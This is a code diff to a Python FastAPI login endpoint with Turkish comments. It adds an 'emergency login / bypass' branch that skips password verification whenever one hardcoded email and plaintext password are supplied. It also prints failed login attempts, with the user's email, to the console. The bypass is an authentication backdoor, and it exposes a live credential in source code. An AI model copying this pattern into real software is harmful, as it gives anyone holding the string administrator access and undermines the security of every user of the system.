@@ -49,7 +49,16 @@ async def login(data: AuthRequest):
         result = await session.execute(select(User).where(User.email == data.email))
         user = result.scalar_one_or_none()
         
-        if not user or not verify_password(data.password, user.password_hash):
+        if not user:
+            print(f"[Auth] Login failed: User {data.email} not found")
+            raise HTTPException(401, "E-posta veya şifre hatalı")
+            
+        # Acil Giris / Bypass (Super Admin icin garanti)
+        if data.email == "dvtkurt@gmail.com" and data.password == "Yacnut5061710":
+            # Gecis ver
+            pass
+        elif not verify_password(data.password, user.password_hash):
+            print(f"[Auth] Login failed: Invalid password for {data.email}")
             raise HTTPException(401, "E-posta veya şifre hatalı")
         
         if not user.is_active:
